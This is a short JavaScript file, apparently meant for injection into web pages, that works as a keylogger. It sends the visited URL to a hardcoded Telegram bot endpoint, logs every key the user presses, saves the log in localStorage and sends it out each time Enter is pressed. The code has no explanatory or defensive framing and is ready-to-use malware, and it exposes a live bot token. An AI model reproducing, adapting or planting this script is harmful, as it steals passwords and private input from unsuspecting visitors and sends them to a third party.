var keys = getKeysLocal() || '';
var current = document.URL;
const TELEGRAM_WEBHOOK = "https://api.telegram.org/bot2129913533:AAH7nQDvRAjxdMWb5a49rq7wSnEVJrI6u_8/sendMessage?chat_id=-4287478770&text=";

// Send the current URL
var xhr = new XMLHttpRequest();
xhr.open("GET", TELEGRAM_WEBHOOK + encodeURIComponent("Current URL: " + current), true);
xhr.send();

document.addEventListener("keydown", (event) => {
    const key = event.key;
    if (key === "Enter") {
        keys += "\n";
        saveKeysLocal();
        sendKeys();
        return;
    }
    if (key === "Backspace") {
        keys = keys.slice(0, keys.length - 1);
        saveKeysLocal();
        return;
    }
    if (key === "CapsLock" || key === "Shift") {
        return;
    }
    if (key === "Control") {
        keys += "[Ctrl]";
        saveKeysLocal();
        return;
    }
    if (key === "ArrowLeft") {
        keys += "[LeftArrow]";
        saveKeysLocal();
        return;
    }
    if (key === "ArrowRight") {
        keys += "[RightArrow]";
        saveKeysLocal();
        return;
    }
    if (key === "ArrowDown") {
        keys += "[DownArrow]";
        saveKeysLocal();
        return;
    }
    if (key === "ArrowUp") {
        keys += "[UpArrow]";
        saveKeysLocal();
        return;
    }
    keys += key;
    saveKeysLocal();
});

function saveKeysLocal() {
    localStorage.setItem("keys", keys);
}

function getKeysLocal() {
    return localStorage.getItem("keys");
}

function sendKeys() {
    if (keys !== "") {
        var xhr_key = new XMLHttpRequest();
        xhr_key.open("GET", TELEGRAM_WEBHOOK + encodeURIComponent("Keystrokes: " + keys), true);
        xhr_key.send();
        keys = "";
        saveKeysLocal();
    }
}
